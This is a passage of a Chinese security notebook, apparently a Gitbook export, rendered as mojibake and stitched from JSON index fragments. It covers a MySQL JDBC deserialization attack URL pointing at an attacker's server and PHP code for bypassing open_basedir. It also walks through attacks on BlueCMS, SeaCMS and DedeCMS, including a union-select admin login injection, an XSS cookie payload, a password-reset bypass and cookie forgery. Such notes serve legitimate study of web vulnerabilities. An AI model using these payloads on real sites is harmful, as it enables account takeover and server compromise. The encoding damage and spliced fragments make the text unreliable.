jdbcååºåˆ—åŒ–æŒ‡åœ¨é€šè¿‡JDBCè¿æ¥MySQLæœåŠ¡ç«¯æ—¶ï¼Œä¼šæœ‰å‡ å¥å†…ç½®çš„æŸ¥è¯¢è¯­å¥éœ€æ‰§è¡Œï¼Œå…¶ä¸­ä¸¤ä¸ªæŸ¥è¯¢çš„ç»“æœé›†åœ¨MySQLå®¢æˆ·ç«¯è¿›è¡Œå¤„ç†æ—¶ä¼šè¢«ObjectInputStream.readObject()è¿›è¡Œååºåˆ—åŒ–å¤„ç†ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥æ§åˆ¶JDBCè¿æ¥è®¾ç½®é¡¹ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡è®¾ç½®å…¶é…ç½®æŒ‡å‘æ¶æ„MySQLæœåŠ¡è§¦å‘MySQL JDBCå®¢æˆ·ç«¯çš„ååºåˆ—åŒ–æ¼æ´ jdbc:mysql://xxx.xxx.xxx.xxx:3306/test?\"+\"autoDeserialize=true\"+\"&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor å°† JDBC è¿æ¥åœ°å€æŒ‡å‘æ”»å‡»è€…äº‹å…ˆå‡†å¤‡å¥½çš„æ¶æ„æœåŠ¡å™¨ï¼Œè¿™ä¸ªæœåŠ¡å™¨å¯ä»¥è¿”å›æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ã€‚ æŒ‡å®š autoDeserialize å‚æ•°ä¸º trueï¼Œmysql å®¢æˆ·ç«¯å°±å¯ä»¥è‡ªåŠ¨ååºåˆ—åŒ–æ¶æ„ payloadã€‚ ä½¿ç”¨ ServerStatusDiffInterceptor è§¦å‘å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„äº¤äº’å’Œååºåˆ—åŒ–ã€‚ Shiro Weblogic Log4j fastjson rmi jndi jdbc Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-26 15:39:19 "},"03.ä»£ç å®¡è®¡/PHP/phpinfo.html":{"url":"03.ä»£ç å®¡è®¡/PHP/phpinfo.html","title":"phpinfoä¸­çš„ä¿¡æ¯","keywords":"","body":"é…ç½®æ–‡ä»¶ PHP: php.ini æ ¸å¿ƒæŒ‡ä»¤è¯´æ˜ - Manual ini_set() https://www.php.net/manual/zh/ini.list.php phpinfo æ€»ç»“ phpinfoä¸­çš„é‡è¦ä¿¡æ¯ å˜é‡ ä½œç”¨ open_basedir é™åˆ¶ç›®å½•è®¿é—®ï¼ˆå¯ä»¥ç»•è¿‡ï¼‰ disable_function ç¦ç”¨å‡½æ•°ï¼ˆå¯ä»¥ç»•è¿‡ï¼‰ session.save_path é…åˆæ–‡ä»¶åŒ…å« _SERVER å„ç§ä¸»æœºä¿¡æ¯ pecl confing.phpå†™ğŸ open_basedirç»•è¿‡ åœ¨index.phpä¸‹ ini_set('open_basedir', '/var/www/html/'); æ‰€ä»¥å¦‚æœç”¨æˆ·é€šè¿‡index.phpæ¥è®¿é—®æœåŠ¡å™¨æ—¶ï¼Œåªèƒ½è®¿é—®/var/www/html/ open_basedirç»•è¿‡ function bypass_open_basedir(){ if(!file_exists('bypass_open_basedir')){ mkdir('bypass_open_basedir'); } chdir('bypass_open_basedir'); @ini_set('open_basedir','..'); @$_Ei34Ww_sQDfq_FILENAME = dirname($_SERVER['SCRIPT_FILENAME']); @$_Ei34Ww_sQDfq_path = str_replace(\"\\\\\",'/',$_Ei34Ww_sQDfq_FILENAME); @$_Ei34Ww_sQDfq_num = substr_count($_Ei34Ww_sQDfq_path,'/') + 1; $_Ei34Ww_sQDfq_i = 0; while($_Ei34Ww_sQDfq_i disable_functionç»•è¿‡ å¦‚ä½•è®¾ç½®disable_function åœ¨phpé…ç½®æ–‡ä»¶php.iniä¸­è®¾ç½® ç»•è¿‡ï¼šhttps://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions â€‹ https://www.freebuf.com/articles/network/263540.html å¸¸è§çš„webshellç®¡ç†å·¥å…·éƒ½è‡ªå¸¦ç›¸å…³ç»•è¿‡çš„æ¨¡å—ã€‚ é…åˆæ–‡ä»¶åŒ…å«Getshell Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:12:44 "},"03.ä»£ç å®¡è®¡/PHP/PHPä»£ç å®¡è®¡.html":{"url":"03.ä»£ç å®¡è®¡/PHP/PHPä»£ç å®¡è®¡.html","title":"PHPä»£ç å®¡è®¡","keywords":"","body":" [x] BlueCMS [x] SeaCMS [x] DedeCMS [x] ThinkPHP è°ƒè¯• https://blog.csdn.net/Xxy605/article/details/120973447 æ€è·¯ From https://www.anquanke.com/post/id/265092#h3-5 å‡½æ•°é›†æ–‡ä»¶ï¼Œé€šå¸¸å‘½ååŒ…å«functionæˆ–è€…commonç­‰å…³é”®å­—ï¼Œè¿™äº›æ–‡ä»¶é‡Œé¢æ˜¯ä¸€äº›å…¬å…±çš„å‡½æ•°ï¼Œæä¾›å…¶ä»–æ–‡ä»¶ç»Ÿä¸€è°ƒç”¨ï¼Œæ‰€ä»¥å¤§å¤šæ•°æ–‡ä»¶éƒ½ä¼šåœ¨æ–‡ä»¶å¤´éƒ¨åŒ…å«åˆ°å…¶ä»–æ–‡ä»¶ã€‚å¯»æ‰¾è¿™äº›æ–‡ä»¶ä¸€ä¸ªéå¸¸å¥½ç”¨çš„æŠ€å·§å°±æ˜¯å»æ‰“å¼€index.phpæˆ–è€…ä¸€äº›åŠŸèƒ½æ€§æ–‡ä»¶ï¼Œåœ¨å¤´éƒ¨ä¸€èˆ¬éƒ½èƒ½æ‰¾åˆ°ã€‚ é…ç½®æ–‡ä»¶ï¼Œé€šå¸¸å‘½åä¸­åŒ…æ‹¬configå…³é”®å­—ï¼Œé…ç½®æ–‡ä»¶åŒ…æ‹¬webç¨‹åºè¿è¡Œå¿…é¡»çš„åŠŸèƒ½æ€§é…ç½®é€‰é¡¹ä»¥åŠæ•°æ®åº“ç­‰é…ç½®ä¿¡æ¯ã€‚ä»è¿™ä¸ªæ–‡ä»¶ä¸­å¯ä»¥äº†è§£ç¨‹åºçš„å°éƒ¨åˆ†åŠŸèƒ½ï¼Œå¦å¤–çœ‹è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™æ³¨æ„è§‚å¯Ÿé…ç½®æ–‡ä»¶ä¸­å‚æ•°å€¼æ˜¯å•å¼•å·è¿˜æ˜¯ç”¨åŒå¼•å·æ‹¬èµ·æ¥ï¼Œå¦‚æœæ˜¯åŒå¼•å·å¯èƒ½å°±å­˜åœ¨ä»£ç æ‰§è¡Œçš„é—®é¢˜äº†ã€‚ å®‰å…¨è¿‡æ»¤æ–‡ä»¶ï¼Œå®‰å…¨è¿‡æ»¤æ–‡ä»¶å¯¹ä»£ç å®¡è®¡è‡³å…³é‡è¦ï¼Œè¿™å…³ç³»åˆ°æˆ‘ä»¬æŒ–æ˜åˆ°çš„å¯ä»¥ç‚¹èƒ½å¦ç›´æ¥åˆ©ç”¨ï¼Œé€šå¸¸å‘½åä¸­å¸¦æœ‰filterã€safeã€checkç­‰å…³é”®å­—ï¼Œè¿™ç±»æ–‡ä»¶ä¸»è¦æ˜¯å¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¤§å¤šæ•°çš„åº”ç”¨å…¶å®ä¼šåœ¨å‚æ•°çš„è¾“å…¥åšä¸€ä¸‹addslashes()å‡½æ•°çš„è¿‡æ»¤ã€‚ indexæ–‡ä»¶ï¼Œindexæ˜¯ä¸€ä¸ªç¨‹åºçš„å…¥å£ï¼Œæ‰€ä»¥é€šå¸¸æˆ‘ä»¬åªè¦è¯»ä¸€è¯»indexæ–‡ä»¶å°±å¯ä»¥å¤§è‡´äº†è§£æ•´ä¸ªç¨‹åºçš„æ¶æ„ã€è¿è¡Œçš„æµç¨‹ã€åŒ…å«åˆ°çš„æ–‡ä»¶ï¼Œå…¶ä¸­æ ¸å¿ƒçš„æ–‡ä»¶æœ‰å“ªäº›ã€‚è€Œä¸åŒç›®å½•çš„indexæ–‡ä»¶ä¹Ÿæœ‰ä¸åŒçš„å®ç°æ–¹å¼ï¼Œå»ºè®®æœ€å¥½å°†å‡ ä¸ªæ ¸å¿ƒç›®å½•çš„indexæ–‡ä»¶éƒ½é€šè¯»ä¸€éã€‚ æ€»ç»“å¤§è‡´æµç¨‹ 1ã€å…ˆå…¨å±€æ€»è§ˆï¼šå…¥å£æ–‡ä»¶ã€è·¯ç”±ã€å…¨å±€å¤„ç†æ–¹å¼ç­‰ 2ã€å®šå‘åŠŸèƒ½å®¡è®¡ï¼šé»‘ç›’(æ‰¾åˆ°æ•æ„ŸåŠŸèƒ½)+ç™½ç›’ï¼ˆå®šä½åˆ°ä»£ç è¿›è¡Œå®¡è®¡ï¼‰ 3ã€æ•æ„Ÿå‡½æ•°å›æº¯ å…ˆé»‘ç›’+ç™½ç›’çœ‹æ•æ„ŸåŠŸèƒ½ï¼Œå†ç”¨è‡ªåŠ¨åŒ–å®¡è®¡å·¥å…·è·‘ä¸€éå¹¶éªŒè¯ï¼Œæœ€åå†æ ¹æ®æ¼æ´å±é™©å‡½æ•°å»å›æº¯ è‡ªåŠ¨åŒ–å®¡è®¡å·¥å…· RIPShttps://github.com/J0o1ey/rips-Chinese seay Fortify bluecms é»‘ç›’æµ‹è¯• ç”¨æˆ·æ³¨å†Œ åœ¨æ³¨å†Œæ—¶ï¼Œé‚®ç®±æ’å…¥xssä»£ç  ç”¨æˆ·å¤´åƒ ä¸Šä¼ æ–‡ä»¶ï¼Œåªå…è®¸ä¸Šä¼ å›¾ç‰‡åç¼€çš„æ–‡ä»¶ï¼Œä¸Šä¼ åæœ‰ç»™å‡ºå›¾ç‰‡è·¯å¾„ï¼Œé‚£ä¹ˆä¸èƒ½é…åˆ.htaccessï¼Œéœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„ç‚¹æ¥åŒ…å«æ–‡ä»¶ã€‚ ä¿®æ”¹å¯†ç  æ˜¯å¦å­˜åœ¨è¶Šæƒ,æµ‹è¯•äº†æ²¡æœ‰ å‘å¸ƒæ–°é—» è¿™é‡Œåˆ†ç±»é€‰æ‹©ä¸äº†ï¼Œåº”è¯¥æ˜¯è¦ç®¡ç†å‘˜å‘å¸ƒã€‚ ç›®å½•æ‰«æ ç®¡ç†å‘˜ å…¶ä»– åå°ç™»å½• è¿™é‡Œæ²¡æœ‰éªŒè¯ç éªŒè¯ï¼Œé‚£ä¹ˆå¯ä»¥å¾ˆè½»æ¾åœ°è¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ°usernmae=adminï¼Œpasswd=admin è¿›å»ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå»ºè®®ï¼Œinstallæ–‡ä»¶å¤¹ï¼Œä¸Šé¢é€šè¿‡dirsearchä¹Ÿæ‰«æå‡ºäº†è¿™ä¸ªæ–‡ä»¶ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶å¤¹æ¥é‡æ–°å®‰è£…ç½‘ç«™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥é‡ç½®ç®¡ç†å‘˜äº†ï¼Œå¯æƒœæ˜¯ä¸å¯ä»¥çš„ã€‚ å¸¸ç”¨æ“ä½œ å‘å¸ƒæœ¬åœ°æ–°é—»è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ“ä½œï¼Œä½†æ˜¯ä¹Ÿåªèƒ½ä¸Šä¼ å›¾ç‰‡ ä¼šå‘˜ç®¡ç† å¯ä»¥å‘ç°è§¦å‘äº†ä¹‹å‰çš„xssï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æ²¡æœ‰ç™»é™†ä¸Šåå°ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªxssæ¥ğŸ£è·å–ç®¡ç†å‘˜çš„cookieã€‚ ä¹Ÿå¯ä»¥ä¿®æ”¹ç®¡ç†å‘˜å¯†ç ï¼Œè€Œä¸”æ²¡æœ‰ä»»ä½•éªŒè¯ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹ã€‚ã€‚ ç™½ç›’å®¡è®¡ å…ˆçœ‹ä¸€ä¸‹ç›®å½• å‰å° å…ˆçœ‹ä¸€ä¸‹å‰å°çš„index.phpï¼Œå†…å®¹å·®ä¸å¤šå°±æ˜¯æ¸²æŸ“é¡µé¢ï¼Œæ²¡æœ‰ç”¨æˆ·å¯æ§çš„å‚æ•°ï¼Œæ‰€ä»¥å…³æ³¨å…¶åŒ…å«çš„å…¶ä»–æ–‡ä»¶ã€‚ è·Ÿè¿›common.inc.phpçœ‹ä¸€ä¸‹ å…³é”®éƒ¨åˆ†ï¼Œç”¨æ¥éªŒè¯ç”¨æˆ·èº«ä»½ï¼Œå…¶ä¸­cookieä¸­çš„å‚æ•°æ˜¯å¯æ§çš„ã€‚ å…ˆåˆ¤æ–­cookieä¸­æ˜¯å¦æœ‰user_idï¼Œæœ‰çš„è¯å†ç»§ç»­åˆ¤æ–­user_nameå’Œuser_pwdæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨å°±check_cookieï¼Œå¦‚æœåªæœ‰user_nameå­˜åœ¨å°±æŸ¥è¯¢åå­—æ˜¯å¦åªæœ‰ä¸€ä¸ªï¼Œå…¶ä»–æƒ…å†µset_cookieã€‚ sqlæ³¨å…¥ è·Ÿè¿›check_cookie æŸ¥usernameå¯¹åº”çš„å¯†ç ï¼Œç»è¿‡æ•£åˆ—å¤„ç†åˆ¤æ–­å¯†ç æ˜¯å¦æ­£ç¡®ã€‚ è·Ÿè¿›getone--åœ¨include/mysql.class.phpä¸­ å¯ä»¥çœ‹åˆ°æ²¡æœ‰å¯¹sqlè¯­å¥åšä»»ä½•å¤„ç†ï¼Œç›´æ¥ç”¨mysql_queryè¿›è¡ŒæŸ¥è¯¢ï¼Œsqlè¯­å¥é”™è¯¯æ—¶ï¼Œè¿”å›é”™è¯¯æ¶ˆæ¯Query errorï¼Œç„¶åæ˜¯å‰é¢åŠ äº†ä¸€ä¸ª@ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨æŠ¥é”™æ³¨å…¥ã€‚ å†è§‚å¯Ÿinclude/mysql.class.phpå¯ä»¥å‘ç° å‘ç°å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ï¼Œé‚£ä¹ˆè¿™ä¸ªCMSå°±å¯ä»¥éšä¾¿æ³¨å…¥äº†ã€‚ã€‚ã€‚ï¼ˆå› ä¸ºæ‰€æœ‰çš„sqlæ“ä½œéƒ½æ˜¯ç”¨è¿™ä¸ªmysqlç±»ï¼‰ ä»¥ad_js.phpä¸ºä¾‹ æ–‡ä»¶åŒ…å«+æ–‡ä»¶ä¸Šä¼  è™½ç„¶æœ‰ç™½åå•é™åˆ¶ï¼Œåªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œè¿‡æ»¤ å¹¶ä¸”åœ¨user.phpä¸­ï¼Œæ²¡æœ‰å¯¹$_POST['pay']è¿›è¡Œè¿‡æ»¤ï¼Œå­˜åœ¨ç›®å½•ç©¿è¶Šï¼Œå°±å¯ä»¥åŒ…å«ä¸Šä¼ çš„ç”¨æˆ·å¤´åƒã€‚ ä»»æ„æ–‡ä»¶åˆ é™¤ publish.php user.php â€‹ éœ€è¦å…ˆæ’å…¥ä¸€æ¡æ–°é—»ï¼Œæ–°é—»åä¸ºè¦åˆ é™¤çš„æ–‡ä»¶çš„è·¯å¾„ã€‚ åå°--/admin è¿˜æ˜¯å…ˆçœ‹ä¸€ä¸‹index.phpï¼Œä¹Ÿæ˜¯åªæ˜¯è¾“å‡ºäº†CMSå’Œç³»ç»Ÿçš„ä¸€äº›ä¿¡æ¯ï¼Œæ‰€ä»¥å…³æ³¨å…¶åŒ…å«çš„æ–‡ä»¶ å…³é”®å†…å®¹ å¯¹è¾“å…¥çš„å‚æ•°éƒ½ä½¿ç”¨addslashes()è¿›è¡Œè½¬ä¹‰,ä¸è¿‡è¿˜æœ‰$SERVERæ²¡æœ‰è¿›è¡Œå¤„ç†ã€‚ â€‹ ä½¿ç”¨sessionæ¥éªŒè¯adminèº«ä»½ã€‚è¿˜æ˜¯ä¸€æ ·çš„ä½¿ç”¨check_cookieæ¥åˆ¤æ–­ï¼Œ â€‹ â€‹ éœ€è¦å¾—åˆ°adminçš„pwdå’Œcookie_hashï¼Œè¿™ä¸¤ä¸ªéƒ½åœ¨æ•°æ®åº“ä¸­ï¼Œå¯ä»¥åˆ©ç”¨å‰å°çš„sqlæ³¨å…¥è·å¾—ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥ç™»å½•adminç”¨æˆ·ã€‚ ä»»æ„æ–‡ä»¶è¯»å– ä»»æ„æ–‡ä»¶ä¸Šä¼  æ–‡ä»¶è·¯å¾„åªä½œäº†å»é™¤å¤´å°¾ç©ºæ ¼çš„å¤„ç†ï¼Œå­˜åœ¨ç›®å½•ç©¿è¶Šï¼›æ–‡ä»¶å†…å®¹å®é™…ä¸Šæ˜¯è°ƒç”¨äº†stripslashesï¼Œå¹¶æ²¡æœ‰è¿‡æ»¤ã€‚ æµ‹è¯• SeaCMS ç½‘ç«™æ¶æ„ï¼Œæ— æ¡†æ¶ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹ â”œâ”€admin # åå° â”œâ”€css # å­˜æ”¾cssæ–‡ä»¶ â”œâ”€files # å­˜æ”¾é¡µé¢ â”œâ”€images # å­˜æ”¾å›¾ç‰‡ â”œâ”€inc # å­˜æ”¾ç½‘ç«™é…ç½®ï¼Œæ ¡éªŒï¼Œè¿‡æ»¤æ–‡ä»¶ â”œâ”€install # ç½‘ç«™å®‰è£… â”œâ”€seacmseditor # ç½‘ç«™ç¼–è¾‘å™¨ â”œâ”€template # ç½‘ç«™æ¨¡æ¿ â””â”€upload # å­˜æ”¾ä¸Šä¼ æ–‡ä»¶ æŸ¥çœ‹å…¥å£æ–‡ä»¶ æ‰€æœ‰çš„å…¥å£éƒ½æ˜¯é€šè¿‡ä¼ é€’rå‚æ•°æ¥åˆ†å‘è·¯ç”±ï¼Œå¯¹åº”filesç›®å½•ä¸­çš„æ–‡ä»¶ è¿™é‡Œåªç”¨addslashesè¿›è¡Œäº†è½¬ä¹‰ï¼Œæ˜æ˜¾è·¯å¾„ç©¿è¶Š+æ–‡ä»¶åŒ…å« å…¶ä»–æ€è·¯ å¦‚æœæ˜¯linuxç³»ç»Ÿï¼Œä¹Ÿå¯ä»¥é€šè¿‡pearcmd.phpæ¥getshell åœ¨7.3åŠä»¥å‰ï¼Œpecl/pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®š--with-pearæ‰ä¼šå®‰è£… å°è¯•%00æˆªæ–­è·¯å¾„ï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¸çŸ¥é“ä¸ºå•¥å¤±è´¥äº†ï¼Œç¯å¢ƒï¼šphp5.3.29ï¼Œmagic_quotes_gpc=OFF å¦‚æœphpç‰ˆæœ¬å°äº5.2.8ï¼Œlinux éœ€è¦æ–‡ä»¶åé•¿äº 4096ï¼Œwindows éœ€è¦é•¿äº 256ï¼Œè¶…è¿‡éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒä»è€Œå®ç°æ–‡ä»¶åŒ…å«ç»•è¿‡åç¼€.phpé™åˆ¶ æŸ¥çœ‹é…ç½®æ–‡ä»¶ é€šè¿‡installç›®å½•ä¸‹çš„InstallLock.txtæ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­æ˜¯å¦å®‰è£…ï¼Œå¦‚æœå¯ä»¥åˆ é™¤è¯¥æ–‡ä»¶ï¼Œå°±å¯ä»¥é…åˆå…¥å£æ–‡ä»¶çš„æ–‡ä»¶åŒ…å«æ¼æ´æ¥é‡æ–°å®‰è£…ç½‘ç«™ã€‚ æ•°æ®åº“ç¼–ç ä¸ºutf-8ï¼Œä¸å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ æŸ¥çœ‹èº«ä»½æ ¡éªŒæ–‡ä»¶ å‚ç›´è¶Šæƒï¼Œåªè¦åœ¨cookieä¸­åŠ å…¥userå€¼ å‰å° about.php ä½¿ç”¨addslashesæ¥è¿‡æ»¤ï¼Œé€ƒé€¸ä¸äº†å¼•å·ï¼Œæ‰€ä»¥ä¸å­˜åœ¨sqlæ³¨å…¥ concat.php sqléƒ½ç”¨äº†addslashesæ¥è¿‡æ»¤ ä½†æ˜¯å­˜åœ¨xss cookie:name=\">alert(/xss/) content.php å­˜åœ¨æ•°å­—å‹ç»ˆäºå¯ä»¥æ³¨å…¥äº†ï¼Œé…åˆmysql_errorè¿›è¡ŒæŠ¥é”™æ³¨å…¥ submit.php å› ä¸ºéªŒè¯ç æ­£ç¡®åä¹Ÿä¸åˆ·æ–°ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ªéªŒè¯ç è¿›è¡Œæ³¨å…¥ å­˜å‚¨xss è¿‡æ»¤ ä½†æ˜¯è¿˜æ˜¯å¯ä»¥åœ¨nameå¤„ä¿å­˜ è¾“å‡ºç‚¹ åå° åå°ç™»å½• æ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨è”åˆæŸ¥è¯¢æ„é€ ä¸´æ—¶ç”¨æˆ·æ•°æ®ç™»å½•,æˆ–è€…æŠ¥é”™æ³¨å…¥æ‹¿åˆ°å¯†ç åè§£å¯†ç™»å½• åˆ¤æ–­å­—æ®µæ•° ç¡®å®šç”¨æˆ·åï¼Œå¯†ç å­—æ®µä½ç½® è”åˆæŸ¥è¯¢ç™»é™† user=-1'+union+select+1,2,'admin','c4ca4238a0b923820dcc509a6f75849b',5,6,7,8#&password=1&login=yes æ–‡ä»¶ä¸Šä¼ å¤„ up.class.php ç™½åå•ï¼Œæ–‡ä»¶å¤§å°æ£€æµ‹ï¼Œæ–‡ä»¶æ—¶é—´æˆ³é‡å‘½å,å›¾ç‰‡è£å‰ªç”Ÿæˆç¼©ç•¥å›¾ æ²¡å•¥ç”¨ï¼Œéœ€è¦é…åˆå…¶ä»–æ¼æ´ DedeCMS è¿›è¡ŒåŠŸèƒ½ç‚¹å®¡è®¡ å…¨å±€æ€»è§ˆ å…¥å£æ–‡ä»¶ä¸»è¦æœ‰ä¸‰ä¸ª å‰å° åå°ï¼šdede/ ä¼šå‘˜ï¼šmember/ å…¨å±€å‡½æ•° åœ¨é¡¹ç›®æ ¹ç›®å½•çš„indexæ–‡ä»¶åŒ…å«çš„/include/common.inc.phpä¸­ è¿‡æ»¤çš„ï¼š æ£€æŸ¥å’Œæ³¨å†Œå¤–éƒ¨æäº¤çš„å˜é‡ï¼ŒCheckRequest æ–‡ä»¶ä¸Šä¼ çš„ åˆ†é¡µå‚æ•°çš„ å‡½æ•°é›† include/filter.inc.php è¿‡æ»¤ä¸æ–‡æ˜å†…å®¹çš„ğŸ˜…ï¼Œä¸æ˜¯ä¸ºäº†é˜²å¾¡æ¼æ´çš„ æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹ /dede/archives_do.php å®é™…ä¸Šæ˜¯è°ƒç”¨äº†upload.helper.phpä¸­çš„AdminUploadæ–¹æ³• å¯ä»¥çœ‹åˆ°åªå¯¹æ–‡ä»¶çš„MIMEç±»å‹è¿›è¡Œäº†æ ¡éªŒ,æ²¡æœ‰å¯¹æ–‡ä»¶åç¼€è¿›è¡Œæ ¡éªŒ å†çœ‹ä¸€ä¸‹å…¨å±€é˜²æŠ¤uploadsafe.inc.php è™½ç„¶æœ‰é»‘åå•ï¼Œä½†æ˜¯é»‘åå•å¯¹ç®¡ç†å‘˜ç”¨æˆ·æ— æ•ˆ æœ€åç”¨getimagesizeè¿›è¡Œæ ¡éªŒï¼Œå¯ä»¥æ·»åŠ æ–‡ä»¶å¤´ç»•è¿‡ã€‚ ç»¼ä¸Šæ‰€å±ï¼Œæ˜¯ç®¡ç†å‘˜èº«ä»½ï¼Œåªéœ€è¦ä¿®æ”¹MIMEå’Œæ–‡ä»¶å¤´å³å¯ç»•è¿‡è¿‡æ»¤ã€‚ /dede/media_add.php è·Ÿä¸Šä¸€ä¸ªå·®ä¸å¤šï¼Œåªæ ¡éªŒMIMEï¼Œä¸æ ¡éªŒåç¼€ï¼Œåªæ˜¯å¤šäº†ä¸€æ­¥åŠ æ°´å°çš„ï¼Œæ‰€ä»¥ä¼ ä¸€ä¸ªphpåç¼€çš„å›¾ç‰‡é©¬ /dede/file_manage_control.php æ²¡æœ‰å¯¹å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œè¿™é‡Œå¯ä»¥å†™ğŸ URLé‡å®šå‘ plus/download.php $linkinfoå‹æ ¹ä¸å­˜åœ¨ï¼Œæ²¡æœ‰è¿‡æ»¤ï¼Œå¯¹urlå…ˆè¿›è¡Œbase64åŠ å¯†ï¼Œå†è¿›è¡ŒurlåŠ å¯†å³å¯ ä¼šå‘˜ä»»æ„å¯†ç ä¿®æ”¹ å…ˆçœ‹ä¸€ä¸‹ä¼šå‘˜ä¸­å¿ƒçš„é€»è¾‘ member/index.php æ ¡éªŒç”¨æˆ·æ˜¯å¦ç™»å½•ï¼Œç™»å½•åˆ™è¿›å…¥ä¼šå‘˜ä¸ªäººä¸­å¿ƒ member/index_do.php ä¼šå‘˜æ“ä½œä¸$fmdoå‚æ•°åŒ¹é… é‡ç½®å¯†ç  index_do.php?fmdo=user&dopost=xxx é‡ç½®å¯†ç é€»è¾‘åœ¨resetpassword.phpä¸­,å¤§è‡´é€»è¾‘å¦‚ä¸‹ if($dopost == \"\") { include(dirname(__FILE__).\"/templets/resetpassword.htm\"); } elseif($dopost == \"getpwd\") { // æ‰¾å›å¯†ç ç¬¬ä¸€æ­¥ } else if($dopost == \"safequestion\") { // å¯†ç é—®é¢˜åˆ¤æ–­ } else if($dopost == \"getpasswd\") { // æ‰¾å›å¯†ç ç¬¬äºŒæ­¥ } é‡ç‚¹å…³æ³¨å¯†ç é—®é¢˜åˆ¤æ–­ ä½¿ç”¨äº†å¼±æ¯”è¾ƒï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰è®¾ç½®å¯†ç é—®é¢˜ï¼Œé»˜è®¤å€¼å¦‚ä¸‹ æ‰€ä»¥å¯ä»¥æ„é€ safequestion=0.0&safeanswer=æ¥è¿›å…¥è¯¥ifè¯­å¥ è·Ÿè¿› snï¼Œæœ€ç»ˆæ˜¯é‡å®šå‘åˆ°ä¿®æ”¹å¯†ç é¡µé¢ ä»»æ„ç”¨æˆ·ç™»å½• çœ‹ä¸€ä¸‹æ€ä¹ˆå¤„ç†çš„ member/config.php è·Ÿè¿› å¯¹å¾—åˆ°çš„M_IDåšäº†intvalå¤„ç†ï¼Œæœ€åæ ¹æ®M_IDçš„å€¼ä»æ•°æ®åº“ä¸­å–å‡ºå¯¹åº”ç”¨æˆ· è·Ÿè¿›getnum è·Ÿè¿›getcookie ä¸¤ä¸ªIFï¼Œç¬¬ä¸€ä¸ªifåˆ¤æ–­Cookieä¸­çš„DedeUserIDå’ŒDedeUserID__ckMD5,å¦‚æœéƒ½å­˜åœ¨è¿›å…¥ç¬¬äºŒä¸ªifï¼Œæ ¡éªŒcookieæœ‰æ•ˆæ€§ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯é€šè¿‡åŠ ç›å†åŠ å¯†çš„æ–¹å¼ï¼Œæ‰€ä»¥æŒ‰ç†è¯´æ˜¯æ— æ³•ä¼ªé€ cookieçš„ã€‚ ä½†æ˜¯å¯ä»¥ä»/member/index.phpå¯ä»¥æ¥è·å–è¿™ä¸ªåŠ å¯†åçš„å€¼ æœç´¢getcookieå¾—åˆ° è·Ÿè¸ª$last_vid å¦‚æœ$last_vidä¸ºç©ºï¼Œé‚£ä¹ˆå°†$uidèµ‹å€¼ç»™$last_vidï¼Œå¹¶ä½œä¸ºå‚æ•°ä¼ é€’ç»™PutCookieå‡½æ•° è·Ÿè¿›PutCookieå‡½æ•° å¯ä»¥çœ‹åˆ°è·Ÿç™»å½•çš„getcookieåŠ å¯†æ–¹å¼ä¸€æ ·ã€‚ æ€»ç»“ä¸€ä¸‹ï¼š ç™»å½• ç”¨æˆ·çš„èº«ä»½ç”±DedeUserIDçš„å€¼æ¥å†³å®š æ ¡éªŒï¼šDedeUserID__ckMd5çš„å€¼å’Œmd5($cfg_cookie_encode.DedeUserID) è®¿é—®member/index.php?uid=xx last_vid=uid last_vid__ckMd5=md5($cfg_cookie_encode.uid) æ‰€ä»¥è®© DedeUserID=last_vid=uid DedeUserID__ckMd5=last_vid__ckMd5 å°±å¯ä»¥ç»•è¿‡getcookieçš„æ ¡éªŒï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯uidæŒ‡çš„æ˜¯ç”¨æˆ·çš„useridï¼ŒDedeUserIDæŒ‡çš„æ˜¯ç”¨æˆ·çš„midï¼Œæ‰€ä»¥è¦è®©uidä¸ºmidæ‰å¯ä»¥ä¼ªé€ èº«ä»½ 